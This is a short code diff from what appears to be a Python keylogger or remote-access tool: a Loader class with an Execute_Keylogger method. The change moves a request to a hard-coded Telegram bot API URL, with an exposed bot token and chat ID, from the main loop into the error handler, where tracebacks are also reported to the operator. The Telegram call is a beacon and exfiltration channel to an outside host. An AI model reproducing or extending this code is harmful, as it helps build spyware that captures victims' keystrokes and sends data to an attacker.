@@ -39,11 +39,11 @@ class Loader():
 		while True:
 			try:
 				pid = psutil.Process(os.getpid())
-				requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=Main&chat_id=1742761281')
 				self.Main()
 			except requests.ConnectionError:
 				pass
 			except Exception as ex:
+				requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=Main&chat_id=1742761281')
 				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + traceback.format_exc())
 	def Execute_Keylogger(self):
 		filename = os.path.abspath(__file__).split("\\")
